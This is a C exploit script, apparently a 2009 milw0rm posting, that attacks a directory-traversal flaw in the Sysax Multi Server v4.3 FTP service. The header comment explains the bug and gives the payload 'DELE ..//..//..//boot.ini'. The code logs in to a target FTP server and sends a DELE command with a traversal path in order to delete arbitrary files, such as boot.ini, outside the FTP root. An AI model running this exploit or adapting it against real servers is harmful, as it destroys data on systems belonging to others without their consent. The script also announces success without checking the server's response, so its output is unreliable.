/*
Sysax Multi Server v4.3 Remote Delete Files.
Server FTP.
http://www.sysax.com/

-------------------------------------------------------------------------------------
A vulnerability is caused due to an input validation error when handling FTP "DELE" 
requests. This can be exploited to escape the FTP root and delete arbitrary files on 
the system via directory traversal attacks using the "..//" character sequence.
-------------------------------------------------------------------------------------

You can delet file boot.ini => DELE ..//..//..//..//..//..//boot.ini


Author: Jonathan Salwan
Mail  : submit [AT] shell-storm.org
Web   : http://www.shell-storm.org
*/

#include "stdio.h"
#include "unistd.h"
#include "stdlib.h"
#include "sys/types.h"
#include "sys/socket.h"
#include "netinet/in.h"

int syntax(char *file)
	{
	fprintf(stderr,"Sysax Multi Server v4.3 Remote Delete Files\n");
	fprintf(stderr,"=>Syntax  : <%s> <ip> <port> <login> <passwd> <file>\n",file);
	fprintf(stdout,"=>Exemple : %s 127.0.0.1 21 login1 password1 ..//..//..//boot.ini\n",file); 
	exit(0);
	}

int main(int argc, char **argv)
{
	if (argc < 5)
		syntax(argv[0]);
	
	int port = atoi(argv[2]);

	int mysocket;
	int mysocket2;
	int srv_connect;
	int sockaddr_long;


		struct sockaddr_in sockaddr_mysocket;
		sockaddr_long = sizeof(sockaddr_mysocket);
		sockaddr_mysocket.sin_family = AF_INET;
		sockaddr_mysocket.sin_addr.s_addr = inet_addr(argv[1]);
		sockaddr_mysocket.sin_port = htons(port);

        char request[50];
	char answer[100];

        fprintf(stdout,"[+]Connect to Server %s\n",argv[1]);

                mysocket2 = socket(AF_INET, SOCK_STREAM, 0);
                        if(mysocket2 == -1){
                        fprintf(stderr,"[-]FAILED SOCKET\n");
			return 1;}

	srv_connect = connect(mysocket2, (struct sockaddr*)&sockaddr_mysocket, sockaddr_long);
		
	if (srv_connect != -1)
 		{	

		sprintf(request, "USER %s\r\n", argv[3]);		
			if (send(mysocket2,request,strlen(request),0) == -1){
				fprintf(stderr,"[-]Send Request USER\t\t[FAILED]\n");
				shutdown(mysocket2,1);
				return 1;}
			else{
				memset(answer,0,100);
				recv(mysocket2,answer,sizeof(answer),0);
			 }


		sprintf(request, "PASS %s\r\n", argv[4]);
                        if (send(mysocket2,request,strlen(request),0) == -1){
                                fprintf(stderr,"[-]Send Request PASS\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
                        else{ 
				memset(answer,0,100);
                                recv(mysocket2,answer,sizeof(answer),0);
                                fprintf(stdout,"[+]>>%s",answer);
                         }


                sprintf(request, "SYST\r\n");
                        if (send(mysocket2,request,strlen(request),0) == -1){
                                fprintf(stderr,"[-]Send Request PASS\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
                        else{
                                memset(answer,0,100);
                                recv(mysocket2,answer,sizeof(answer),0);
                                fprintf(stdout,"[+]>>%s",answer);
                         }


		sprintf(request, "DELE %s\r\n", argv[5]);
                        if (send(mysocket2,request,strlen(request),0) == -1){
                                fprintf(stderr,"[-]Send Request DELE\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
                        else{ 
				memset(answer,0,100);
                                recv(mysocket2,answer,sizeof(answer),0);
                                fprintf(stdout,"[+]>>%s",answer);
                         }
				
			
		}
	else{
		fprintf(stderr,"[-]Connect\t\t[FAILED]\n");
		shutdown(mysocket2,1);
		return 1;}


	shutdown(mysocket2,1);


fprintf(stdout,"[+]Done! %s has been deleted\n", argv[5]);
return 0;
}

// milw0rm.com [2009-03-23]
